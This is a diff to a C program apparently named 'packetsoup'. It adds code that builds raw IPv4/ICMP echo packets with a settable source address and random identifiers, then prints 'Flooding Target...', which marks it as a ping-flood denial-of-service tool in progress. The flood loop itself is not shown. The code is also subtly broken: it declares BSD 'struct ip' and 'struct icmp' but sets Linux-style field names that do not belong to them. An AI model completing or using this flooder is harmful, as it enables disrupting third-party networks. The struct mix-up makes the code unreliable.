@@ -7,9 +7,16 @@
  * Version 2 Written By Josh Harshman (DeadDingo)
  * All Rights Reserved 12.21.2013
  *
+ * ================================================
+ * Version 2 Channel Log:
+ *
+ *  - Better Argument Parsing
+ *  - 
+ *
  * */
 
 #include "packetsoup.h"
+
 
 int main ( int argc, char *argv[ ] ) {
 
@@ -68,6 +75,55 @@ int main ( int argc, char *argv[ ] ) {
     perror("setsockopt");
     return 0;
   }
+
+  //calculate packet size
+  //WARNING!!!
+  //The Structs iphdr and icmphdr might not exist in Apple OSX
+  //In order to maintain cross platform usability, utilize the makefile to do conditional preprocessing.
+  int packet_size = sizeof(struct ip) + sizeof(struct icmp) + payload_size;
+  char *packet = (char *)malloc(packet_size);
+
+  if(!packet) {
+    perror("No Memory");
+    close(sockfd);
+    return 0;
+  }
+
+  //ip header
+  struct ip *iphdr = (struct ip *)packet;
+  struct icmp *icmphdr = (struct icmp *) (packet + sizeof(struct ip));
+
+  //zero the packet buffer
+  memset(packet, 0, packet_size);
+  
+  //set member variables and whatnot
+  iphdr->version = 4;
+  iphdr->ihl = 5;
+  iphdr->tos = 0;
+  iphdr->tot_len = htons(packet_size);
+  iphdr->id = rand();
+  iphdr->frag_off = 0;
+  iphdr->ttl = 255;
+  iphdr->protocol = IPPROTO_ICMP;
+  iphdr->saddr = saddr;
+  iphdr->daddr = daddr;
+  //
+  
+  icmphdr->icmp_type = ICMP_ECHO;
+  icmphdr->icmp_code = 0;
+  icmphdr->icmp_seq = rand();
+  icmphdr->icmp_id = rand();
+  icmphdr->icmp_cksum = 0;
+  
+  struct sockaddr_in servaddr;
+  servaddr.sin_family = AF_INET;
+  servaddr.sin_addr.s_addr = daddr;
+
+  memset(&servaddr.sin_zero, 0, sizeof(servaddr.sin_zero));
+
+  puts("Flooding Target...");
+
+  
 
   return 0;
 }
